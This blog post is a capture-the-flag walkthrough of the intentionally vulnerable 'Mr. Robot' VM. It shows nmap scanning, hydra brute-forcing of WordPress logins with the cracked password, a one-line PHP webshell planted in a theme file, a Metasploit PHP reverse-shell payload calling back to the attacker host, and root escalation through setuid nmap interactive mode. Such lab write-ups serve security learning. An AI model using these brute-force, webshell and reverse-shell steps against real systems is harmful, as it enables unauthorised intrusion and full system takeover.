<!doctype html><html><head><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"\/"},"articleSection":"projects","name":"Mr. Robot","headline":"Mr. Robot","description":"Vulnerable VM image","inLanguage":"en","author":"","creator":"","publisher":"","accountablePerson":"","copyrightHolder":"","copyrightYear":"2018","datePublished":"2018-04-07 00:00:00 \u002b0000 UTC","dateModified":"2018-04-07 00:00:00 \u002b0000 UTC","url":"\/projects\/mr.-robot\/","wordCount":"802","keywords":["ctf","gobuster","execve","Blog"]}</script><title>Mr. Robot</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.110.0"><meta name=description content="Vulnerable VM image"><meta name=twitter:card content="summary"><meta name=twitter:title content="Mr. Robot"><meta name=twitter:description content="Vulnerable VM image"><meta name=twitter:site content="@brimston3"><meta property="og:title" content="Mr. Robot"><meta property="og:description" content="Vulnerable VM image"><meta property="og:type" content="article"><meta property="og:url" content="/projects/mr.-robot/"><meta property="article:section" content="projects"><meta property="article:published_time" content="2018-04-07T00:00:00+00:00"><meta property="article:modified_time" content="2018-04-07T00:00:00+00:00"><meta property="og:image" content="//images/logo.png"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="512"><meta property="og:image:height" content="512"><meta itemprop=name content="Mr. Robot"><meta itemprop=description content="Vulnerable VM image"><meta itemprop=datePublished content="2018-04-07T00:00:00+00:00"><meta itemprop=dateModified content="2018-04-07T00:00:00+00:00"><meta itemprop=wordCount content="802"><meta itemprop=keywords content="ctf,gobuster,execve,"><link rel=stylesheet href=/css/external.css><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/css/add-on.css><link rel=stylesheet href=/css/academicons.min.css></head><body><div id=wrapper><header id=header><h1><a href=/>projects</a></h1><nav class=links><ul><li><a href=/><i class="fa fa-home">&nbsp;</i>Home</a></li><li><a href=/blog/><i class="fa fa-newspaper-o">&nbsp;</i>Blog</a></li><li><a href=/projects/><i class="fa fa-list">&nbsp;</i>Projects</a></li><li><a href=/tags/><i class="fa fa-tags">&nbsp;</i>Tags</a></li></ul></nav><nav class=main><ul><li id=share-nav class=share-menu style=display:none><a class=fa-share-alt href=#share-menu>Share</a></li><li class=menu><a class=fa-bars href=#menu>Menu</a></li></ul></nav></header><section id=menu><section><form class=search method=get action=//google.com/search><input type=text name=q placeholder=Search>
<input type=hidden name=as_sitesearch value=/></form></section><section><ul class=links><li><a href=/><h3><i class="fa fa-home">&nbsp;</i>Home</h3></a></li><li><a href=/blog/><h3><i class="fa fa-newspaper-o">&nbsp;</i>Blog</h3></a></li><li><a href=/projects/><h3><i class="fa fa-list">&nbsp;</i>Projects</h3></a></li><li><a href=/tags/><h3><i class="fa fa-tags">&nbsp;</i>Tags</h3></a></li></ul></section><section class=recent-posts><div class=mini-posts><header><h3>Recent Posts</h3></header><article class=mini-post><header><h3><a href=/blog/windows-mischief/>Windows Mischief</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/blog/the-taste-of-the-day/>The Taste of the Day</a></h3><time class=published datetime=2019-12-20>December 20, 2019</time></header></article><article class=mini-post><header><h3><a href=/blog/blog-post-automation/>Blog Post Automation</a></h3><time class=published datetime=2019-12-06>December 6, 2019</time></header></article></div></section></section><section id=share-menu><section id=social-share-nav><ul class=links><header><h3>Share this post <i class="fa fa-smile-o"></i></h3></header><li><a href="//twitter.com/share?url=%2fprojects%2fmr.-robot%2f&text=Mr.%20Robot&via=brimston3" target=_blank class="share-btn email"><i class="fa fa-twitter"></i><p>Twitter</p></a></li>&nbsp;<li><a href="//www.facebook.com/sharer/sharer.php?u=%2fprojects%2fmr.-robot%2f" target=_blank class="share-btn email"><i class="fa fa-facebook"></i><p>Facebook</p></a></li>&nbsp;<li><a href="//reddit.com/submit?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-reddit-alien"></i><p>Reddit</p></a></li>&nbsp;<li><a href="//www.linkedin.com/shareArticle?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-linkedin"></i><p>LinkedIn</p></a></li>&nbsp;<li><a href="//www.stumbleupon.com/submit?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-stumbleupon"></i><p>StumbleUpon</p></a></li>&nbsp;<li><a href="//www.pinterest.com/pin/create/button/?url=%2fprojects%2fmr.-robot%2f&description=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-pinterest-p"></i><p>Pinterest</p></a></li>&nbsp;<li><a href="mailto:?subject=Check out this post by &body=%2fprojects%2fmr.-robot%2f" target=_blank class="share-btn email"><i class="fa fa-envelope"></i><p>Email</p></a></li>&nbsp;</ul></section></section><div id=main><article class=post><header><div class=title><h1><a href=/projects/mr.-robot/>Mr. Robot</a></h1><p>Vulnerable VM image</p></div><div class=meta><time class=published datetime=2018-04-07>April 7, 2018</time>
<span class=author></span>
<span class=author>CTF VM</span></div></header><section id=social-share><ul class=icons><li><a href="//twitter.com/share?url=%2fprojects%2fmr.-robot%2f&text=Mr.%20Robot&via=brimston3" target=_blank class="share-btn email"><i class="fa fa-twitter"></i><p>Twitter</p></a></li>&nbsp;<li><a href="//www.facebook.com/sharer/sharer.php?u=%2fprojects%2fmr.-robot%2f" target=_blank class="share-btn email"><i class="fa fa-facebook"></i><p>Facebook</p></a></li>&nbsp;<li><a href="//reddit.com/submit?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-reddit-alien"></i><p>Reddit</p></a></li>&nbsp;<li><a href="//www.linkedin.com/shareArticle?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-linkedin"></i><p>LinkedIn</p></a></li>&nbsp;<li><a href="//www.stumbleupon.com/submit?url=%2fprojects%2fmr.-robot%2f&title=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-stumbleupon"></i><p>StumbleUpon</p></a></li>&nbsp;<li><a href="//www.pinterest.com/pin/create/button/?url=%2fprojects%2fmr.-robot%2f&description=Mr.%20Robot" target=_blank class="share-btn email"><i class="fa fa-pinterest-p"></i><p>Pinterest</p></a></li>&nbsp;<li><a href="mailto:?subject=Check out this post by &body=%2fprojects%2fmr.-robot%2f" target=_blank class="share-btn email"><i class="fa fa-envelope"></i><p>Email</p></a></li>&nbsp;</ul></section><div id=content><p>This system was setup with a host only network on virtualbox 5.2.</p><p>Download from <a href=https://www.vulnhub.com/entry/mr-robot-1,151/>vulnhub</a> or <a href="magnet:?xt=urn:btih:09DA3994B7F437A321D67720FD84E1091BF000CE&dn=mrRobot.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969">magnet</a></p><h2 id=enumeration>Enumeration</h2><p>Started with nmap, basic settings:</p><pre tabindex=0><code># nmap -sS --script vuln 192.168.56.101 -A
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-07 23:19 UTC
Pre-scan script results:                                                                                                   
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.101       
Host is up (0.00084s latency).
Not shown: 997 filtered ports                                                          
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh                        
80/tcp  open   http     Apache httpd
| http-csrf:                                                                           
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.101
|   Found the following possible CSRF vulnerabilities:
…
|     Path: http://192.168.56.101:80/wp-login.php
|     Form id: loginform
|_    Form action: http://192.168.56.101/wp-login.php          
|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
| http-enum:           
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
</code></pre><p>Looks like this is a wordpress blog. Also robots.txt:</p><pre tabindex=0><code># curl http://192.168.56.101/robots.txt                    
User-agent: *                                                                   
fsocity.dic                                                                                        
key-1-of-3.txt
</code></pre><p>Looks like a dictionary file of some sort. 858k lines is a lot, but sorted and dedupped, it&rsquo;s a lot fewer:</p><pre tabindex=0><code># wc -l fsocity.dic
858160 fsocity.dic
# sort fsocity.dic | uniq &gt; fsocity.sorted
# wc -l fsocity.sorted
11451 fsocity.sorted
</code></pre><p>The tool of choice for wordpress is wpscan. However, it&rsquo;s not terribly helpful for figuring out usernames with default settings:</p><pre tabindex=0><code># wpscan -u 192.168.56.101 --enumerate u
[+] Enumerating usernames ...
[+] We did not enumerate any usernames
</code></pre><p>Wordpress has a weakness that allows brute force guessing of usernames. Login attempts for users that don&rsquo;t exist have the string &ldquo;Invalid username&rdquo; in the response. Switching to hydra, it&rsquo;s easier to make progress:</p><pre tabindex=0><code># hydra -L fsocity.sorted -p asdf 192.168.56.101 http-form-post &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username&#34;
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-08 00:52:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://192.168.56.101:80//wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username
[STATUS] 619.00 tries/min, 619 tries in 00:01h, 10833 to do in 00:18h, 16 active
[STATUS] 613.67 tries/min, 1841 tries in 00:03h, 9611 to do in 00:16h, 16 active
[80][http-post-form] host: 192.168.56.101   login: ELLIOT   password: asdf
[80][http-post-form] host: 192.168.56.101   login: Elliot   password: asdf
[STATUS] 618.14 tries/min, 4327 tries in 00:07h, 7125 to do in 00:12h, 16 active
[STATUS] 617.08 tries/min, 7405 tries in 00:12h, 4047 to do in 00:07h, 16 active
[80][http-post-form] host: 192.168.56.101   login: elliot   password: asdf
[STATUS] 617.06 tries/min, 10490 tries in 00:17h, 962 to do in 00:02h, 16 active
[STATUS] 616.83 tries/min, 11103 tries in 00:18h, 349 to do in 00:01h, 16 active
1 of 1 target successfully completed, 3 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-08 01:10:35
</code></pre><p>This looks like the username is not case sensitive even. Running hydra again with only a little bit changed should reveal a password, if it&rsquo;s in this wordlist:</p><pre tabindex=0><code># hydra -f -l elliot -P fsocity.sorted 192.168.56.101 http-form-post &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:incorrect&#34;
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-04-08 01:16:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.56.101:80//wp-login.php:log=^USER^&amp;pwd=^PASS^:incorrect
[STATUS] 568.00 tries/min, 568 tries in 00:01h, 10884 to do in 00:20h, 16 active
[STATUS] 562.67 tries/min, 1688 tries in 00:03h, 9764 to do in 00:18h, 16 active
[STATUS] 558.86 tries/min, 3912 tries in 00:07h, 7540 to do in 00:14h, 16 active
[80][http-post-form] host: 192.168.56.101   login: elliot   password: ER28-0652
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-04-08 01:23:27
</code></pre><p>With the username and password, an admin login is now possible.</p><p>!! Low privs</p><p>With admin control of a wordpress blog, the easiest thing to do is edit a theme file, like the 404 file, and insert some sort of php webshell. It can be as simple as <code>@passthru($_POST['cmd');</code> or as complicated as a meterpreter session:</p><pre tabindex=0><code>&gt; use payload/php/meterpreter/reverse_tcp
&gt; set LHOST 192.168.56.1
&gt; set LPORT 443
&gt; generate -t raw
&gt; to_handler
</code></pre><p>Opening a shell, will reveal the daemon user.</p><p>!! Root privs</p><p>Following standard local file enumeration gets a list a setuid programs:</p><pre tabindex=0><code>$ find / -perm /6000 -type f 2&gt;/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
/sbin/unix_chkpwd
</code></pre><p>It&rsquo;s not normal for nmap to have a suid bit set. This is probably the way in:</p><pre tabindex=0><code>/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h &lt;enter&gt; for help
nmap&gt; !sh
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=0(root),1(daemon)
</code></pre><p>While the uid of the sh process spawned by nmap is not 0, the effective uid is 0, and it is possible to do anything as the root user.</p></div><footer><ul class=stats></ul></footer></article></div><section id=sidebar><section id=intro><a href=/><img src=/img/main/logo.jpg class=intro-circle width=100 alt=brimstone></a><header><h2>brimstone's blog</h2><p>Armchair architect × Agent of creativity & humor × Future compatible × Sysadmin finding poetry in code × AGPLv3 enthusiast × Timezone believer × he/him</p></header><ul class=icons><li><a href=//github.com/brimstone target=_blank title=GitHub class="fa fa-github"></a></li><li><a href=//twitter.com/brimston3 target=_blank title=Twitter class="fa fa-twitter"></a></li><li><a href=mailto:brimstone@the.narro.ws title=Email class="fa fa-envelope"></a></li></ul></section><section class=recent-posts><div class=mini-posts><header><h3>Recent Posts</h3></header><div class=posts-container><article class=mini-post><header><h3><a href=/blog/windows-mischief/>Windows Mischief</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/blog/the-taste-of-the-day/>The Taste of the Day</a></h3><time class=published datetime=2019-12-20>December 20, 2019</time></header></article><article class=mini-post><header><h3><a href=/blog/blog-post-automation/>Blog Post Automation</a></h3><time class=published datetime=2019-12-06>December 6, 2019</time></header></article></div></div><div class=mini-posts><header><h3>Recent Projects</h3></header><div class=posts-container><article class=mini-post><header><h3><a href=/projects/machine-learning-research/>Machine Learning Research</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/projects/free-services/>Free Services</a></h3><time class=published datetime=2023-02-17>February 17, 2023</time></header></article><article class=mini-post><header><h3><a href=/projects/vulnerable-windows-drivers/>Vulnerable Windows Drivers</a></h3><time class=published datetime=2021-04-11>April 11, 2021</time></header></article><article class=mini-post><header><h3><a href=/projects/raspberry-pi-aarch64/>Raspberry Pi aarch64</a></h3><time class=published datetime=2021-03-22>March 22, 2021</time></header></article><article class=mini-post><header><h3><a href=/projects/d1-mini/>D1 mini</a></h3><time class=published datetime=2021-03-13>March 13, 2021</time></header></article></div><a href=/blog/ class=button>View more projects</a></div></section><section id=footer><p class=copyright>&copy; 2023
brimstone's blog
.
Powered by <a href=//gohugo.io target=_blank>Hugo</a></p></section></section></div><a id=back-to-top href=# class="fa fa-arrow-up fa-border fa-2x"></a>
<script src=/js/external.js></script>
<script src=/js/util.js></script>
<script src=/js/main.js></script>
<script src=/js/backToTop.js></script>
<script>hljs.initHighlightingOnLoad()</script></body></html>